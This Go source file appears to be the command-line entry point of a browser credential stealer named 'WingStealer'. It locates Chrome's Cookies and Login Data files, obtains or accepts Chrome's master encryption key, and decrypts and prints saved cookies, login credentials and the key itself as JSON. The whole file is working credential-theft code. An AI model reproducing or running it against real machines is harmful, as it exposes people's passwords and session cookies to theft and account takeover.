package main

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"runtime"

	"github.com/ultra-supara/WingStealer/browsingdata"
	"github.com/ultra-supara/WingStealer/masterkey"
)

func getDefaultPath(kind string) string {
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	basePath := filepath.Join(usr.HomeDir, "Library/Application Support/Google/Chrome/Default")
	switch kind {
	case "cookie":
		return filepath.Join(basePath, "Cookies")
	case "logindata":
		return filepath.Join(basePath, "Login Data")
	default:
		return ""
	}
}

func main() {
	// Parse cli options
	kind := flag.String("kind", "", "cookie or logindata")
	localState := flag.String("localstate", "", "(optional) Chrome Local State file path")
	sessionstorage := flag.String("sessionstorage", "", "(optional) Chrome Sesssion Storage on Keychain (Mac only)")
	targetPath := flag.String("targetpath", "", "(optional) File path of the kind (Cookies or Login Data)")

	flag.Parse()
	if *kind == "" {
		flag.Usage()
		os.Exit(1)
	}

	// Set default path if not specified
	path := *targetPath
	if path == "" {
		path = getDefaultPath(*kind)
		if path == "" {
			log.Fatal("Invalid kind specified")
		}
	}

	// Get Chrome's master key
	var decryptedKey string
	if *sessionstorage == "" {
		// Default path to get master key
		k, err := masterkey.GetMasterKey(*localState)
		if err != nil {
			log.Fatalf("Failed to get master key: %v", err)
		}
		decryptedKey = base64.StdEncoding.EncodeToString(k)
	} else if runtime.GOOS == "windows" {
		// Direct master key input for Windows.
		// If a hex string is provided, convert it to a base64 encoded string.
		inputKey := *sessionstorage
		if KeyBites, err := hex.DecodeString(inputKey); err == nil {
			decryptedKey = base64.StdEncoding.EncodeToString(KeyBites)
		} else {
			decryptedKey = inputKey
		}
	}
	fmt.Println("Master Key: " + decryptedKey)

	// Get Decrypted Data
	log.SetOutput(os.Stderr)
	switch *kind {
	case "cookie":
		c, err := browsingdata.GetCookie(decryptedKey, path)
		if err != nil {
			log.Fatalf("Failed to get logain data: %v", err)
		}
		output := struct {
			Cookies []browsingdata.Cookie `json:"cookies"`
		}{
			Cookies: c,
		}

		encoder := json.NewEncoder(os.Stdout)
		encoder.SetIndent("", "  ")
		if err := encoder.Encode(output); err != nil {
			log.Fatalf("Failed to encode cookie data: %v", err)
		}

	case "logindata":
		ld, err := browsingdata.GetLoginData(decryptedKey, path)
		if err != nil {
			log.Fatalf("Failed to get login data: %v", err)
		}
		for _, v := range ld {
			j, _ := json.Marshal(v)
			fmt.Println(string(j))
		}

	default:
		fmt.Println("Failed to get kind")
		os.Exit(1)
	}
}
